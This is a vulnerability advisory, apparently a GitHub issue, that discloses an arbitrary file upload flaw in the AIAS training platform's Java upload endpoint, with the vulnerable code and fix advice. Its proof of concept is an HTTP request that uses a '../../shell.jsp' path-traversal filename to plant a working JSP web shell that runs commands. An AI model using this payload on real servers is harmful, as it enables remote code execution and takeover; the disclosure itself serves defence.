# Vulnerability Description

The open source Java AI one-stop solution project "[mymagicpower/AIAS](https://github.com/mymagicpower/AIAS)" has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary malicious files to any path on the server, resulting in arbitrary code execution.

- Vulnerability Discloser: [Tr0e](https://github.com/Tr0e)

- Vendors:  [http://aias.top/](http://aias.top/)

- Source code address：[https://github.com/mymagicpower/AIAS](https://github.com/mymagicpower/AIAS)

- https://github.com/mymagicpower/AIAS/issues/46

Note: **This vulnerability was discovered automatically by my AI code audit tool**.

# Vulnerability Analysis

The vulnerability code entry point is located at：

[training_platform/train-platform/src/main/java/top/aias/training/controller/LocalStorageController.java](https://github.com/mymagicpower/AIAS/blob/main/2_training_platform/train-platform/src/main/java/top/aias/training/controller/LocalStorageController.java)

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
    //src/main/java/top/aias/training/controller/LocalStorageController.java
    @PostMapping("/file")
    public ResultBean create(@RequestParam("file") MultipartFile multipartFile) {
        FileUtil.checkSize(properties.getMaxSize(), multipartFile.getSize());
        String suffix = FileUtil.getExtensionName(multipartFile.getOriginalFilename());
        String type = FileUtil.getFileType(suffix);
        File file = FileUtil.upload(multipartFile, properties.getPath().getPath() + type + File.separator);
        if (ObjectUtil.isNull(file)) {
            throw new BadRequestException("上传失败");
        }
        try {
            LocalStorage localStorage = new LocalStorage(
                    file.getName(),
                    FileUtil.getFileNameNoEx(multipartFile.getOriginalFilename()),
                    suffix,
                    file.getPath(),
                    type,
                    FileUtil.getSize(multipartFile.getSize())
            );

            localStorageService.addStorageFile(localStorage);
        } catch (Exception e) {
            FileUtil.del(file);
            throw e;
        }
        return ResultBean.success();
    }

    //src/main/java/top/aias/training/utils/FileUtil.java
    public static String getExtensionName(String filename) {
        if ((filename != null) && (filename.length() > 0)) {
            int dot = filename.lastIndexOf('.');
            if ((dot > -1) && (dot < (filename.length() - 1))) {
                return filename.substring(dot + 1);
            }
        }
        return filename;
    }

    //src/main/java/top/aias/training/utils/FileUtil.java
    public static File upload(MultipartFile file, String filePath) {
        Date date = new Date();
        SimpleDateFormat format = new SimpleDateFormat("yyyyMMddhhmmssS");
        String name = getFileNameNoEx(file.getOriginalFilename());
        String suffix = getExtensionName(file.getOriginalFilename());
        String nowStr = "-" + format.format(date);
        try {
            String fileName = name + nowStr + "." + suffix;
            String path = filePath + fileName;
            // getCanonicalFile 可解析正确各种路径
            File dest = new File(path).getCanonicalFile();
            // 检测是否存在目录
            if (!dest.getParentFile().exists()) {
                if (!dest.getParentFile().mkdirs()) {
                    System.out.println("was not successful.");
                }
            }
            // 文件写入
            file.transferTo(dest);
            return dest;
        } catch (Exception e) {
            log.error(e.getMessage(), e);
        }
        return null;
    }
```

As you can see, the external API entry "/file" receives the MultipartFile uploaded by the user and directly passes it to the "FileUtil.upload" function for processing. At the same time, without any security check, the user-controlled file name and suffix are directly referenced as the final file path and name saved on the server, which will form a typical file upload vulnerability.

Attackers can use this vulnerability to upload malicious Trojan files to the victim's server, thereby controlling its server.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file.

The vulnerability proof of concept (POC) is as follows:

```js
POST /api/localStorage/file HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Content-Length: 628

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="../../shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
------WebKitFormBoundary7MA4YWxk--
```

The relevant verification screenshots are shown below:

![Image](https://private-user-images.githubusercontent.com/42080954/420566503-b5254e90-9058-45e5-acee-96aa29975ade.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDE0MTU4MTAsIm5iZiI6MTc0MTQxNTUxMCwicGF0aCI6Ii80MjA4MDk1NC80MjA1NjY1MDMtYjUyNTRlOTAtOTA1OC00NWU1LWFjZWUtOTZhYTI5OTc1YWRlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAzMDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMzA4VDA2MzE1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTllYmIwMjU2OTM4NjA4YTg2ZDUwMmY4MjAxY2I0ZGEyMzBhNDJhZjE3N2MzYzYwNmFhNGFjZDQyNjAwY2Y3ZDImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.QTOR-d26BIqK84zsq7ocOm0DeTc364dPZ2Gw-8bkK4s)

![Image](https://private-user-images.githubusercontent.com/42080954/420566518-2c9947cd-f7d6-459c-b3fd-4f5b9d1dd026.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDE0MTU4MTAsIm5iZiI6MTc0MTQxNTUxMCwicGF0aCI6Ii80MjA4MDk1NC80MjA1NjY1MTgtMmM5OTQ3Y2QtZjdkNi00NTljLWIzZmQtNGY1YjlkMWRkMDI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAzMDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMzA4VDA2MzE1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThlZGEwNjI2OGQ0MTU3NzY4ZGZjNWU3MWZlMzkwNmFmZWQwZmQzODlmOWNhZDgzOTBjY2MxYzE3Y2YyYmUxOGYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vuA59UniVNdHInNxYwpJMvRgtm36alh1IGs_y6ohVdM)

![Image](https://private-user-images.githubusercontent.com/42080954/420566530-c282077a-0837-4b74-be64-ea866f9a3182.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDE0MTU4MTAsIm5iZiI6MTc0MTQxNTUxMCwicGF0aCI6Ii80MjA4MDk1NC80MjA1NjY1MzAtYzI4MjA3N2EtMDgzNy00Yjc0LWJlNjQtZWE4NjZmOWEzMTgyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAzMDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMzA4VDA2MzE1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTcyYzRiOWMyYTczOGNhNjdmMWI4MjkzZDE3NzY1NmQ1YzM3NjEzNTI1OGYzMDk0ZjEwNWZlNDBlYTI5YTE0NzEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.0h7B5Gcbje-Fhlv_jFZ07r5znX-ygqmhgFSxz-x9Z84)

![Image](https://private-user-images.githubusercontent.com/42080954/420566547-0bb2f168-426a-4dc2-9291-7e5b8449a292.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDE0MTU4MTAsIm5iZiI6MTc0MTQxNTUxMCwicGF0aCI6Ii80MjA4MDk1NC80MjA1NjY1NDctMGJiMmYxNjgtNDI2YS00ZGMyLTkyOTEtN2U1Yjg0NDlhMjkyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAzMDglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMzA4VDA2MzE1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU5NmQwZDU3ZmJlZWEwMDAyNDJmMjA2M2Q2MmI0YTFiYzZkYjFhYTA1YTVlOWJhYzBiOTNiNWRjZmIxYWYzMDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.FcT4fbSj6m3hA5zBbPe8ozNTgZ6_Ea-wAbnyaSgLC8A)

# Security Suggestions

Please limit the uploaded file types and check the file suffixes to prevent attackers from uploading malicious Trojan programs.

At the same time, the uploaded file path needs to be strictly restricted, and it is forbidden to use the file name information transmitted by the front end to splice the final file storage path
